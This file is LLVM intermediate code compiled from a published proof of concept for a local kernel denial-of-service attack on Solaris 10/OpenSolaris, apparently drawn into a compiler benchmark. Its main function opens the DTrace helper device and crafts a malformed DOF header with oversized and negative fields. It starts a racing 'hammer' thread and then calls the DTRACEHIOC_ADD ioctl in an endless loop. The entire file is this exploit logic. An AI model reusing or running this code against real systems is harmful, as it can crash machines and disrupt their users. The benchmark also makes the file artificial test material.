; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_8597.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_8597.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%union.anon = type { %struct.dof_hdr, [262120 x i8] }
%struct.dof_hdr = type { i32, i32, i32, i32, i8** }

@.str = private unnamed_addr constant [125 x i8] c"Solaris >= 10/Opensolaris local kernel DoS PoC\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@DTRACE_HELPER = common dso_local global i8* null, align 8
@O_RDONLY = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"failed opening %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@DOF_MAG_STRING = common dso_local global i32 0, align 4
@DOF_MAG_STRLEN = common dso_local global i32 0, align 4
@DOF_MODEL_LP64 = common dso_local global i8* null, align 8
@DOF_ID_MODEL = common dso_local global i64 0, align 8
@DOF_ENCODE_NATIVE = common dso_local global i8* null, align 8
@DOF_ID_ENCODING = common dso_local global i64 0, align 8
@DOF_VERSION_2 = common dso_local global i8* null, align 8
@DOF_ID_VERSION = common dso_local global i64 0, align 8
@DOF_ID_DIFVERS = common dso_local global i64 0, align 8
@DIF_DIR_NREGS = common dso_local global i8* null, align 8
@DOF_ID_DIFIREG = common dso_local global i64 0, align 8
@DIF_DTR_NREGS = common dso_local global i8* null, align 8
@DOF_ID_DIFTREG = common dso_local global i64 0, align 8
@hammer = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [31 x i8] c"failed creating hammer thread\0A\00", align 1
@DTRACEHIOC_ADD = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [28 x i8] c"tried %d-times, %d-changes\0D\00", align 1
@changes = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %union.anon, align 8
  %7 = alloca %struct.dof_hdr*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str, i64 0, i64 0))
  %13 = load i8*, i8** @DTRACE_HELPER, align 8
  %14 = load i32, i32* @O_RDONLY, align 4
  %15 = call i32 @open(i8* %13, i32 %14)
  store i32 %15, i32* %9, align 4
  %16 = load i32, i32* %9, align 4
  %17 = icmp slt i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = load i8*, i8** @DTRACE_HELPER, align 8
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  %22 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %22, i32* %3, align 4
  br label %106

23:                                               ; preds = %2
  %24 = bitcast %union.anon* %6 to %struct.dof_hdr*
  store %struct.dof_hdr* %24, %struct.dof_hdr** %7, align 8
  %25 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %26 = call i32 @memset(%struct.dof_hdr* %25, i32 0, i32 24)
  %27 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %28 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %27, i32 0, i32 4
  %29 = load i32, i32* @DOF_MAG_STRING, align 4
  %30 = load i32, i32* @DOF_MAG_STRLEN, align 4
  %31 = call i32 @memcpy(i8*** %28, i32 %29, i32 %30)
  %32 = load i8*, i8** @DOF_MODEL_LP64, align 8
  %33 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %34 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %33, i32 0, i32 4
  %35 = load i8**, i8*** %34, align 8
  %36 = load i64, i64* @DOF_ID_MODEL, align 8
  %37 = getelementptr inbounds i8*, i8** %35, i64 %36
  store i8* %32, i8** %37, align 8
  %38 = load i8*, i8** @DOF_ENCODE_NATIVE, align 8
  %39 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %40 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %39, i32 0, i32 4
  %41 = load i8**, i8*** %40, align 8
  %42 = load i64, i64* @DOF_ID_ENCODING, align 8
  %43 = getelementptr inbounds i8*, i8** %41, i64 %42
  store i8* %38, i8** %43, align 8
  %44 = load i8*, i8** @DOF_VERSION_2, align 8
  %45 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %46 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %45, i32 0, i32 4
  %47 = load i8**, i8*** %46, align 8
  %48 = load i64, i64* @DOF_ID_VERSION, align 8
  %49 = getelementptr inbounds i8*, i8** %47, i64 %48
  store i8* %44, i8** %49, align 8
  %50 = load i8*, i8** @DOF_VERSION_2, align 8
  %51 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %52 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %51, i32 0, i32 4
  %53 = load i8**, i8*** %52, align 8
  %54 = load i64, i64* @DOF_ID_DIFVERS, align 8
  %55 = getelementptr inbounds i8*, i8** %53, i64 %54
  store i8* %50, i8** %55, align 8
  %56 = load i8*, i8** @DIF_DIR_NREGS, align 8
  %57 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %58 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %57, i32 0, i32 4
  %59 = load i8**, i8*** %58, align 8
  %60 = load i64, i64* @DOF_ID_DIFIREG, align 8
  %61 = getelementptr inbounds i8*, i8** %59, i64 %60
  store i8* %56, i8** %61, align 8
  %62 = load i8*, i8** @DIF_DTR_NREGS, align 8
  %63 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %64 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %63, i32 0, i32 4
  %65 = load i8**, i8*** %64, align 8
  %66 = load i64, i64* @DOF_ID_DIFTREG, align 8
  %67 = getelementptr inbounds i8*, i8** %65, i64 %66
  store i8* %62, i8** %67, align 8
  %68 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %69 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %68, i32 0, i32 0
  store i32 1024, i32* %69, align 8
  %70 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %71 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %70, i32 0, i32 1
  store i32 1024, i32* %71, align 4
  %72 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %73 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %72, i32 0, i32 2
  store i32 -65536, i32* %73, align 8
  %74 = load i32, i32* @hammer, align 4
  %75 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %76 = call i32 @pthread_create(i32* %11, i32* null, i32 %74, %struct.dof_hdr* %75)
  store i32 %76, i32* %10, align 4
  %77 = load i32, i32* %10, align 4
  %78 = icmp slt i32 %77, 0
  br i1 %78, label %79, label %83

79:                                               ; preds = %23
  %80 = load i32, i32* @stderr, align 4
  %81 = call i32 (i32, i8*, ...) @fprintf(i32 %80, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))
  %82 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %82, i32* %3, align 4
  br label %106

83:                                               ; preds = %23
  store i32 0, i32* %8, align 4
  br label %84

84:                                               ; preds = %103, %83
  %85 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %86 = getelementptr inbounds %struct.dof_hdr, %struct.dof_hdr* %85, i32 0, i32 3
  store i32 131072, i32* %86, align 4
  %87 = load i32, i32* %9, align 4
  %88 = load i32, i32* @DTRACEHIOC_ADD, align 4
  %89 = load %struct.dof_hdr*, %struct.dof_hdr** %7, align 8
  %90 = call i32 @ioctl(i32 %87, i32 %88, %struct.dof_hdr* %89)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  %93 = zext i1 %92 to i32
  %94 = call i32 @assert(i32 %93)
  %95 = load i32, i32* %8, align 4
  %96 = srem i32 %95, 64
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %102, label %98

98:                                               ; preds = %84
  %99 = load i32, i32* %8, align 4
  %100 = load i32, i32* @changes, align 4
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i32 %99, i32 %100)
  br label %102

102:                                              ; preds = %98, %84
  br label %103

103:                                              ; preds = %102
  %104 = load i32, i32* %8, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %8, align 4
  br label %84

106:                                              ; preds = %79, %18
  %107 = load i32, i32* %3, align 4
  ret i32 %107
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @memset(%struct.dof_hdr*, i32, i32) #1

declare dso_local i32 @memcpy(i8***, i32, i32) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, %struct.dof_hdr*) #1

declare dso_local i32 @ioctl(i32, i32, %struct.dof_hdr*) #1

declare dso_local i32 @assert(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
